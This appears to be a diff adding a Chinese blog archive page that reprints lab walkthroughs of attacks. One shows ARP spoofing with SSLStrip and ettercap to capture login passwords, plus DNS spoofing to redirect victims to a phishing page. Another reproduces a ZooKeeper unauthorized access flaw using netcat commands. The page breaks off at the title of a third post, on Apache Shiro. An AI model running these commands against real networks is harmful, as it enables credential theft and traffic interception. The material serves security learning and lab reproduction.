@@ -1,0 +1,788 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    
+    <title>Archives: 2023/12 | 氕氘氚</title>
+    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
+    <meta name="HandheldFriendly" content="True"/>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="google-site-verification" content=""/>
+    <meta name="baidu-site-verification" content=""/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="Open your eyes to see the light in life">
+<meta property="og:type" content="website">
+<meta property="og:title" content="氕氘氚">
+<meta property="og:url" content="http://example.com/archives/2023/12/page/2/index.html">
+<meta property="og:site_name" content="氕氘氚">
+<meta property="og:description" content="Open your eyes to see the light in life">
+<meta property="og:locale">
+<meta property="article:author" content="Szczecin">
+<meta name="twitter:card" content="summary">
+    
+
+    <!-- Favicon -->
+    
+        <link rel="icon" href="/img/favicon.ico" />
+    
+
+    <!-- Font -->
+    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">
+
+    
+<link rel="stylesheet" href="/style.css">
+
+    <script>
+      function setLoadingBarProgress(num) {
+        document.getElementById('loading-bar').style.width = num + "%";
+      }
+    </script>
+
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+
+<script>setLoadingBarProgress(20)</script>
+
+<div id="site-wrapper">
+
+    <header id="header">
+    <div id="header-wrapper" class="clearfix">
+        <a id="logo" href="/">
+            <img src="/img/logo.png"/>
+            <span id="site-desc">
+                Be A Gorgeous World
+            </span>
+        </a>
+        <button id="site-nav-switch">
+            <span class="icon icon-menu"></span>
+        </button>
+    </div>
+</header>
+    <script>setLoadingBarProgress(40);</script>
+
+    <main id="main" role="main">
+        
+    
+
+
+  <section class="page-header archive">
+    <h1>- <span>2023.12</span> -</h1>
+  </section>
+
+
+
+
+<section class="post-list">
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/06/ARP-SSLStrip/">
+                如何进行一次完整的 SSLStrip 攻击
+            </a>
+        </h2>
+    
+    <time>
+        Dec 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="如何进行一次完整的-sslstrip-攻击">如何进行一次完整的 SSLStrip 攻击</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://glsakura.gitee.io/2020/04/02/%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84%20SSLStrip%20%E6%94%BB%E5%87%BB/">Glsakura</a> 并作补充</p>
+</blockquote>
+<h2><span id="简介">简介</span></h2><blockquote>
+<p>本文将介绍在局域网内，如何监听受害者流量并通过SSLstrip攻击获取敏感信息，分为如下两步：</p>
+<ol>
+<li>中间人攻击，监听受害者流量</li>
+<li>SSLStrip攻击，获取敏感信息</li>
+</ol>
+</blockquote>
+<h2><span id="实验环境">实验环境</span></h2><blockquote>
+<table>
+<thead>
+<tr>
+<th>IP地址</th>
+<th>MAC地址</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>win10</td>
+<td>192.168.40.1</td>
+<td>00:50:56:C0:00:08</td>
+</tr>
+<tr>
+<td>网关</td>
+<td>192.168.40.2</td>
+<td>00:50:56:E7:9F:31</td>
+</tr>
+<tr>
+<td>kali</td>
+<td>192.168.40.128</td>
+<td>00:0c:29:d8:d4:05</td>
+</tr>
+<tr>
+<td>win7</td>
+<td>192.168.40.130</td>
+<td>00:0C:29:C9:34:A6</td>
+</tr>
+<tr>
+<td>centos7</td>
+<td>192.168.40.132</td>
+<td>00:0c:29:bd:ef:65</td>
+</tr>
+</tbody></table>
+<p>kali：<a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/kali-images/kali-2020.1b/kali-linux-2020.1b-live-amd64.iso">kali-linux-2020.1b-live-amd64.iso</a></p>
+<p>win7：<a target="_blank" rel="noopener" href="http://d0.ananas.chaoxing.com/download/16169a8dcb8f0e07b98d19c870b10ce3?fn=WIN7lite(x64)">win7</a></p>
+<p>纯净虚拟机系统，使用VMware或者VirtualBox导入镜像即可。<br>采用Win7SP1镜像制作，极限精简，无多余组件，非常纯净，使用流畅，系统已激活。</p>
+</blockquote>
+<h2><span id="中间人攻击">中间人攻击</span></h2><blockquote>
+<p>中间人攻击（<a target="_blank" rel="noopener" href="http://man.linuxde.net/man">man</a>-in-the-Middle Attack, MITM)，就是攻击者扮演中间人进行攻击，可以劫持一段会话，窃取凭证和其他机密信息。简而言之，所谓的MITM攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情。</p>
+</blockquote>
+<h3><span id="arp-地址解析协议">ARP （地址解析协议）</span></h3><blockquote>
+<p>ARP 协议负责通过 IP 地址找到 MAC 地址（物理地址 ），在以太网中，是利用 MAC 地址来通讯的。</p>
+<p>ARP协议是这样工作的：如win10需要给win7（IP为192.168.40.130)发送数据，为了知道谁是win7，首先win10发送一个广播包给网内所有机器“谁是192.168.40.130”，正常情况其他机器忽略该消息，仅win7回复“我是192.168.40.130”，于是通信就可以开始。所有的主机维护他们自己的ARP缓存表，所以不会每一次都发送广播，ARP表中包含IP对应的MAC地址。</p>
+</blockquote>
+<h4><span id="如何进行arp欺骗">如何进行ARP欺骗?</span></h4><blockquote>
+<p>例如kali需要对win7进行arp欺骗，那他就不再忽略win10发送的消息，他也会大量的发送数据包回复“啊啊啊！我才是192.168.40.130”，然后win10就会错误地建立或者更新了自己ARP表。然后win10发送数据时都发到kali那去了。</p>
+</blockquote>
+<h2><span id="攻击准备">攻击准备</span></h2><h4><span id="mac-下准备">mac 下准备</span></h4><blockquote>
+<ol>
+<li>安装 macports <a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=https://www.macports.org/install.php">官网</a></li>
+<li>更新 macports <code>sudo port -d selfupdate</code></li>
+<li>安装 dsniff（包含 arp 攻击的工具）<code>sudo port install dsniff</code></li>
+<li>安装 nmap <code>brew install nmap</code> (如果没有安装 Homebrew，可以去 <a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=http://brew.sh/">Homebrew 官网</a></li>
+</ol>
+</blockquote>
+<h4><span id="linux-下准备">linux 下准备</span></h4><blockquote>
+<ol>
+<li>安装 dsniff <code>apt-get install -y dsniff</code></li>
+<li>安装 nmap <code>apt-get install -y nmap</code></li>
+</ol>
+</blockquote>
+<h2><span id="攻击步骤">攻击步骤</span></h2><h3><span id="寻找目标">寻找目标</span></h3><blockquote>
+<p>使用nmap命令扫描局域网，获得主机列表<br>如果所在局域网路由器地址是 192.168.40.1,可以使用 <code>nmap -sP 192.168.40.1/24</code> 扫描</p>
+<p>-sP 表示使用 ping 方式扫描，192.168.40.1&#x2F;24”表示扫描”192.168.40.1-192.168.40.254”这个网段的所有机器。</p>
+</blockquote>
+<h3><span id="开启-ip-转发">开启 IP 转发</span></h3><blockquote>
+<p>ARP欺骗一般目的是把自己伪装成网关，但如果不作处理，当被欺骗数据包到达后就会被本机丢弃（因为本机不是网关，不知道如何处理这类数据包），这会导致没有数据包返回给被欺骗主机，导致断网。这当然是不允许的。开启IP转发功能可以解决该问题。IP转发负责把该类数据包再转发给真正的网关处理，开启IP转发的方法。</p>
+<p>mac 下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.inet.ip.forwarding=1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>linux 下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="arp-欺骗">ARP 欺骗</span></h3><blockquote>
+<p>假设被攻击的 IP 是 192.168.40.130，局域网的网关是 192.168.40.2，攻击电脑使用的网卡接口是 eth0(可以使用 <code>ifconfig</code> 命令查看）, 则欺骗命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.40.130 192.168.40.2</span><br><span class="line"><span class="comment">#arpspoof是dsniff的一个组件，主要用于进行arp欺骗使用</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>成功的的话在被攻击主机上arp表如图所示</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/1.png" alt="image"></p>
+</blockquote>
+<h3><span id="分析数据">分析数据</span></h3><blockquote>
+<p>如果 ARP 欺骗成功，则被攻击的设备会把所有数据先传到我们电脑上，接下来可以使用 ettercap 软件来分析数据。</p>
+</blockquote>
+<h2><span id="使用driftnet获取图片">使用driftnet获取图片</span></h2><blockquote>
+<p>安装driftnet<code>apt-get install driftnet</code></p>
+<p>开始获取<code>driftnet -i eth0</code></p>
+<p>找一个http的网站进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:“http” -https</span><br></pre></td></tr></table></figure>
+
+<p>例子：<code>http://www.kan-tv.com/</code></p>
+<p>Tips:https因为进行了加密不能直接获取，进行SSLStrip攻击后就可获取了</p>
+</blockquote>
+<h2><span id="sslstrip-攻击">SSLStrip 攻击</span></h2><blockquote>
+<p>2009年的黑帽大会上，一个名叫Moxie Marlinspike的研究人员,发布了一个叫sslstrip的工具。通过该工具，可以实现对ssl进行中间人攻击。</p>
+<p>SSLstrip 也叫 https 降级攻击，攻击者拦截用户流量后，欺骗用户与攻击者进行 http 通信，攻击者与服务器保持正常通信 （http 或 https），从而获取用户信息。</p>
+</blockquote>
+<h3><span id="攻击原理">攻击原理</span></h3><blockquote>
+<p>攻击者利用用户对于地址栏中HTTPS与HTTP的疏忽，将所有的HTTPS连接都用HTTP来代替。同时，与目标服务器建立正常的HTTPS连接。由于HTTP通信是没有经过加密传输的，并没有HTTPS安全，所以攻击者能轻松实施嗅探。</p>
+<ol>
+<li>通过中间人攻击监听 http 流量</li>
+<li>更改重定向链接中的 location，替换 https 为 http，并记录</li>
+<li>更改响应内容中的超链接，替换 https 为 http，并记录</li>
+<li>与用户进行 http 通信，与服务器进行 https 通信（记录中本应是 https 的请求），从而明文获取用户信息</li>
+</ol>
+<p>Tips:</p>
+<p>当用户浏览的网页中包含https协议，会被转化为http协议的请求</p>
+<p>但是sslstrip也不是万能的， 假如网页中没有https， 但是js代码绑定了跳转到https的协议请求的事件，那么sslstrip就失效了</p>
+</blockquote>
+<h3><span id="攻击准备">攻击准备</span></h3><blockquote>
+<ol>
+<li><p>监听 http 流量</p>
+</li>
+<li><p>获取 <a target="_blank" rel="noopener" href="https://moxie.org/software/sslstrip/">sslstrip工具</a></p>
+<p>Requirements</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Python &gt;= 2.5 (apt-get install python)</span><br><span class="line">The python <span class="string">&quot;twisted-web&quot;</span> module (apt-get install python-twisted-web)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get -y install python python-twisted-web</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/moxie0/sslstrip.git</span><br><span class="line"><span class="built_in">cd</span> sslstrip &amp;&amp; python ./setup.py install</span><br></pre></td></tr></table></figure></li>
+</ol>
+</blockquote>
+<h3><span id="攻击步骤">攻击步骤</span></h3><h4><span id="开启内核转发功能保证攻击过程中被攻击者不断网">开启内核转发功能保证攻击过程中被攻击者不断网</span></h4><blockquote>
+<p>临时ip转发</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
+
+<p>永久ip转发</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sysctl.conf</span><br><span class="line">net.ipv4.ip_forward = 1        //修改值</span><br><span class="line">sysctl -p /etc/sysctl.conf    //使修改生效</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4><span id="把流量导入到-sslstrip-程序">把流量导入到 sslstrip 程序</span></h4><blockquote>
+<p>设置iptables以将HTTP通信重定向到sslstrip。<br>输入命令： <code>iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000</code><br>其中最后面的端口号（比如上面的 10000）就是 sslstrip 程序监听的端口号</p>
+<p>如果攻击完成后要删除这条记录可以输入命令 <code>iptables -t nat -D PREROUTING 1</code></p>
+<p>查看 ip 转发表： <code>iptables -t nat -L</code></p>
+</blockquote>
+<h4><span id="运行arpspoof以说服网络他们应该将流量发送给你">运行arpspoof以说服网络他们应该将流量发送给你</span></h4><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.40.130 192.168.40.2</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4><span id="启动sslstrip">启动sslstrip</span></h4><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -l 10000</span><br><span class="line"></span><br><span class="line">-w &lt;文件名&gt;，–write = &lt;文件名&gt;指定要登录的文件（可选）。</span><br><span class="line">-p，–post仅记录SSL POST。（默认）</span><br><span class="line">-s，–ssl记录往返服务器的所有SSL流量。</span><br><span class="line">-a，–all记录往返服务器的所有SSL和HTTP通信。</span><br><span class="line">-l &lt;端口&gt;，–listen = &lt;端口&gt;用于侦听的端口（默认为10000）。</span><br><span class="line">-f，–favicon根据安全请求替换锁图标。</span><br><span class="line">-k，–killsessions终止正在进行的会话。</span><br><span class="line">-h 打印此帮助消息。</span><br><span class="line"></span><br><span class="line">查看端口占用lsof -i tcp:10000</span><br><span class="line"></span><br><span class="line">sslstrip -a -k -f -l 10000</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/ARP-SSLStrip/2.png" alt="image"></p>
+<p>可以看到，网页上没有任何不安全的警告或是提示，只是原先的HTTPS连接已经被HTTP连接所替换，并且为增加迷惑性，网页的图标被修改成了一个银色的锁图案。但是，假的毕竟是假的，一方面无法查看到任何证书的信息，另外如果在网址前输入https:&#x2F;&#x2F;，则网页无法发开。因此，sslstrip并不是万能的攻击方法。</p>
+</blockquote>
+<h3><span id="使用ettercap对目标主机进行arp攻击并且开始嗅探密码">使用ettercap对目标主机进行arp攻击，并且开始嗅探密码</span></h3><blockquote>
+<p>终端界面嗅探密码<code>ettercap -Tq -i eth0</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-P  使用插件</span><br><span class="line">-T  使用基于文本界面</span><br><span class="line">-q  启动安静模式（不回显）</span><br><span class="line">-M  启动ARP欺骗攻击</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们使用ettercap的GTK+ GUI图像界面<code>ettercap -G</code></p>
+<p><img src="/2023/12/06/ARP-SSLStrip/3.png" alt="image"></p>
+<p>选择Sniff—-Unified-sniffing，然后选择网卡：eth0(我这里是eth0，大家根据情况选择)。</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/4.png" alt="image"></p>
+<p>然后Hosts——Scan for hosts——Hosts list</p>
+<p>我们的目标主机ip(192.168.40.130)选定目标主机，然后点add to target 1，将目标主机添加到目标；选定路由，点add to target 2，将路由添加到目标2</p>
+<p>添加成功后，点击Mitm——ARP posoning ，勾选sniff remote connections。</p>
+<p>之后start——start sniffing开始监听。</p>
+<p>点击view——connections查看被攻击机访问的IP，端口，协议，发送和接收的数据包大小。</p>
+<p>点击view——profiles查看被攻击机访问的链接。在下方可以查看更清晰的链接访问情况。</p>
+<p>当然你也可以通过双击链接来查看profiles details，即访问网站的具体情况。</p>
+<p>在这里，如果被攻击机输入密码登陆某一网站，我们可以检测到登陆的用户名及其密码。</p>
+<p>这是刚刚检测到的一个用户名和登陆密码。这个网站完全没有对密码进行加密操作，出来的结果也是明文显示的。</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/5.png" alt="image"></p>
+<p>这是另外一个站检测出来的，对密码进行了加密。</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/6.png" alt="image"></p>
+<p>Tips：其实一个网站如果使用的都是https协议，那么安全性一般做的比较好，数据进行了加密的，也就是说你即使已经把https降低为http，即使捕获到了密码，你也不可能轻易解密的出来。</p>
+</blockquote>
+<h4><span id="测试网址">测试网址</span></h4><blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://www.freemojo.com</span><br><span class="line">//http密码明文未加密</span><br><span class="line">http://bbs.ylnet.com.cn/forum.php</span><br><span class="line">//http密码加密了</span><br><span class="line">http://www.discuz.net/forum.php</span><br><span class="line">//https密码未加密</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="dns欺骗">DNS欺骗</span></h3><blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leafpad /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure>
+
+<p>在微软处添加：</p>
+<p>&#96;<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> A 192.168.40.132</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/7.png" alt="image"></p>
+<p>ettercap -G（进入图形界面）</p>
+<p>重复之前的步骤ARP欺骗的步骤，在start sniffing之前添加一个插件</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/8.png" alt="image"></p>
+<p>双击启动dns_spoof</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/9.png" alt="image"></p>
+<p>开始嗅探后，我们在目标机中ping一下百度</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/10.png" alt="image"></p>
+<p>欺骗成功，如果将192.168.40.132改为钓鱼页面，就可以欺骗到用户账号密码</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/11.png" alt="image"></p>
+<p>最后提醒大家，连接公共wifi时一定要小心！</p>
+</blockquote>
+<h2><span id="参考资料">参考资料</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/983d43b4ba1e">如何进行一次完整的 SSLStrip</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/paperpen/p/10810690.html">ARP欺骗之ettercap图形化界面</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bbf50dace855">APR攻击（Arpspoof）</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/li_101357/article/details/78416813">linux ip 转发设置 ip_forward、ip_forward与路由转发</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/kuiguowei/article/details/79070945">HTTP&amp;HTTPS账号密码获取与ettercap局域网内DNS欺骗</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bingyublog.com/2018/02/23/%E4%BD%BF%E7%94%A8ssltrip%E7%AA%81%E7%A0%B4ssl%E5%8A%A0%E5%AF%86%E6%88%AA%E8%8E%B7%E5%AF%86%E7%A0%81/">使用ssltrip突破ssl加密截获密码</a></p>
+<p><a target="_blank" rel="noopener" href="https://moxie.org/software/sslstrip/">sslstrip</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/5929.html">利用sslstrip和ettercap突破ssl嗅探密码</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.linuxde.net/2011/11/2522.html">针对SSL的中间人攻击演示和防范</a></p>
+<p><a target="_blank" rel="noopener" href="https://tools.kali.org/information-gathering/sslstrip">sslstrip Package Description</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/ARP/" rel="tag">ARP</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSLStrip/" rel="tag">SSLStrip</a><a class="tag-none-link" href="/tags/WiFi/" rel="tag">WiFi</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/06/CVE-2014-085-ZooKeeper/">
+                ZooKeeper 未授权访问漏洞（CVE-2014-085） 复现
+            </a>
+        </h2>
+    
+    <time>
+        Dec 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="zookeeper-未授权访问漏洞cve-2014-085-复现">ZooKeeper 未授权访问漏洞（CVE-2014-085） 复现</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44108455/article/details/107708133">gclome</a> 并作补充</p>
+<p>最近想收集一下近几年的通用型漏洞，然后就找到了这个漏洞，那就先来这个漏洞吧！</p>
+</blockquote>
+<h2><span id="zookeeper未授权访问漏洞是什么">ZooKeeper未授权访问漏洞是什么</span></h2><blockquote>
+<p>ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。</p>
+<p>ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境</p>
+</blockquote>
+<h2><span id="漏洞原因">漏洞原因</span></h2><blockquote>
+<p>默认安装配置完的zookeeper允许未授权访问，管理员未配置访问控制列表（ACL）。导致攻击者可以在默认开放的2181端口下通过执行envi命令获得大量敏感信息（系统名称、java环境）导致任意用户可以在网络不受限的情况下进行未授权访问读取数据甚至杀死服务。</p>
+<p>（原因如下：默认的ACL中未进行限制访问）</p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/1.png" alt="image"></p>
+<p>用于访问控制的模式有：<br>（1）world 代表任何用户<br>（2）auth 不使用任何id，代表任何已经认证过的用户<br>（3）digest 使用username:password认证，password使用md5哈希之后base64再编码，现改成了sha1加密。<br>（4）ip 用客户端的ip作为ACL的标识。</p>
+</blockquote>
+<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
+<p>测试机： Kali （192.168.133.134）<br>靶机： Kali（192.168.133.132）<br>版本：zookeeper-3.4.14</p>
+<p>分别在测试机和靶机都安装zookeeper-3.4.14<br>安装命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#搭建环境</span></span><br><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz</span><br><span class="line">tar -xzvf zookeeper-3.4.14.tar.gz </span><br><span class="line"><span class="built_in">cd</span> zookeeper-3.4.14/conf</span><br><span class="line"><span class="built_in">mv</span> zoo_sample.cfg zoo.cfg</span><br><span class="line">../bin/zkServer.sh start <span class="comment"># 启动</span></span><br></pre></td></tr></table></figure>
+
+<p>搭建成功 默认端口是2181</p>
+</blockquote>
+<h2><span id="漏洞证明">漏洞证明</span></h2><blockquote>
+<p>尝试连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./zkCli.sh -server  192.168.133.132 2181</span><br></pre></td></tr></table></figure>
+
+<p>如下图，连接成功</p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/2.png" alt="image"></p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/3.png" alt="image"></p>
+<p>并且存在此漏洞！</p>
+<p>获取该服务器的环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> envi|nc 192.168.133.132 2181</span><br></pre></td></tr></table></figure>
+
+<p>通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。</p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/4.png" alt="image"></p>
+</blockquote>
+<h2><span id="漏洞利用">漏洞利用</span></h2><h3><span id="part1">part1</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stat</span>：列出关于性能和连接的客户端的统计信息。</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">stat</span> |nc 192.168.133.132 2181</span><br><span class="line"></span><br><span class="line">ruok：测试服务器是否运行在非错误状态。</span><br><span class="line"><span class="built_in">echo</span> ruok |nc 192.168.133.132 2181</span><br><span class="line"></span><br><span class="line">reqs：列出未完成的请求。</span><br><span class="line"><span class="built_in">echo</span> reqs |nc 192.168.133.132 2181</span><br><span class="line"></span><br><span class="line">envi：打印有关服务环境的详细信息。</span><br><span class="line"><span class="built_in">echo</span> envi |nc 192.168.133.132 2181</span><br><span class="line"></span><br><span class="line">dump：列出未完成的会话和临时节点。</span><br><span class="line"><span class="built_in">echo</span> dump |nc 192.168.133.132 2181</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/5.png" alt="image"></p>
+</blockquote>
+<h3><span id="part2">part2</span></h3><blockquote>
+<p>我们在zk的客户端可以进行节点权限的查看和设置。</p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/6.png" alt="image"></p>
+<p>从上述操作可以看出，zk新创建的znode默认访问方式为world。我们通过addauth和setAcl给&#x2F;test节点设置访问权限为digest，操作权限为cdrwa，用户名为user，密码为password。</p>
+<p>当然，我们使用getAcl是无法获取可访问用户test的明文密码的（要是可以获取明文密码，不又是个漏洞嘛~~）。</p>
+<p>另启zk客户端，执行ls &#x2F;test,发现当前用户已经无法访问&#x2F;test节点，提示信息为“Authentication is not valid”。解决方法就是addauth添加认证用户了，并且必须使用用户名和密码明文进行认证。</p>
+<p>addauth添加digest认证用户user后，即可正常访问&#x2F;test节点了。</p>
+<p>另外，还有一点需要注意，znode的ACL是相互独立的。也就是说，任意不同节点可以用不同的acl列表，互不影响，并且ACL是不可被继承的。</p>
+<p>我们在&#x2F;test下创建leaf节点，可发现，leaf节点的认证方式为world，即任何用户都有访问权限。</p>
+</blockquote>
+<h4><span id="利用zookeeper可视化管理工具进行连接">利用zookeeper可视化管理工具进行连接</span></h4><blockquote>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip">https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip</a></p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/7.png" alt="image"></p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/8.png" alt="image"></p>
+</blockquote>
+<h2><span id="修复方案">修复方案</span></h2><blockquote>
+<p>禁止把Zookeeper直接暴露在公网</p>
+<p>添加访问控制，根据情况选择对应方式（认证用户，用户名密码，指定IP）</p>
+<p>配置防火墙策略，只允许指定IP访问2181端口</p>
+<p>配置服务ACL限制IP访问</p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011721501/article/details/44062617">https://blog.csdn.net/u011721501/article/details/44062617</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0nc3/p/12071281.html">https://www.cnblogs.com/0nc3/p/12071281.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6103#toc-7">https://xz.aliyun.com/t/6103#toc-7</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Aaron_Miller/article/details/106049421">https://blog.csdn.net/Aaron_Miller/article/details/106049421</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ilovena/p/9484522.html">https://www.cnblogs.com/ilovena/p/9484522.html</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/ZooKeeper/" rel="tag">ZooKeeper</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/06/CVE-2020-1957-Apache-Shiro/">
+                Apache Shiro 认证绕过漏洞 CVE-2020-1957 漏洞复现
